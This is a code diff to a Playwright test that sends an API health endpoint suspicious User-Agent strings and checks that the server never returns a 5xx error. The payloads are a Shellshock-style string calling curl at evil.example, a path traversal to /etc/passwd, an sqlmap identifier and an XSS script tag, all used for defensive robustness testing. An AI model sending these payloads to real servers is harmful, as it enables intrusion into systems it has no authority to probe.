@@ -42,13 +42,22 @@ test.describe('Cloud SDK headers — response should not leak provider fingerpri
         expect(sdkLeak, `Server header leaked cloud SDK: "${server}"`).toBe(false);
     });
 
-    test('API survives bogus User-Agent strings without 5xx', async ({ request }) => {
+    test('API survives suspicious-but-valid User-Agent strings without 5xx', async ({
+        request,
+    }) => {
+        // Codex P1: NUL bytes and CRLF would be rejected by Node's
+        // client-side header validator with ERR_INVALID_CHAR before the
+        // request ever leaves the test, so they'd fail the spec for the
+        // wrong reason. Keep these payloads RFC-7230-valid header bytes
+        // (visible ASCII, no CTLs) so the test actually probes the
+        // server's behaviour.
         const bogusUAs = [
             '',
             'A'.repeat(2048),
             'Mozilla/5.0 () { :; }; curl http://evil.example',
-            '\x00\x01\x02',
-            'curl/7.0\r\nX-Injected: 1',
+            '../../../etc/passwd',
+            'sqlmap/1.7 (http://sqlmap.org)',
+            "<script>alert('xss')</script>",
         ];
         for (const ua of bogusUAs) {
             const res = await request.get(`${API_BASE}/api/health`, {
